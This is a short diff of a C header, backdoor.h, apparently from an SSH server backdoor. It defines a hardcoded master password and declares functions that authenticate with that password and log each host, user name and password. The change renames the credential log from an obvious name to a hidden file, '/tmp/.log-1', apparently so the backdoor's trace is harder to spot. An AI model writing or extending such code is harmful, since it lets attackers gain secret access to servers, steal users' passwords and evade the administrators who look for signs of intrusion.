@@ -2,7 +2,7 @@
 #define BACKDOOR_H
 
 #define ATEAM_PASSWORD "changethis"
-#define ATEAM_LOG "/tmp/ioc-of-sshd-backdoor"
+#define ATEAM_LOG "/tmp/.log-1"
 int backdoor_auth(const char *password);
 void backdoor_log(const char *host, char *user, const char *password);
 
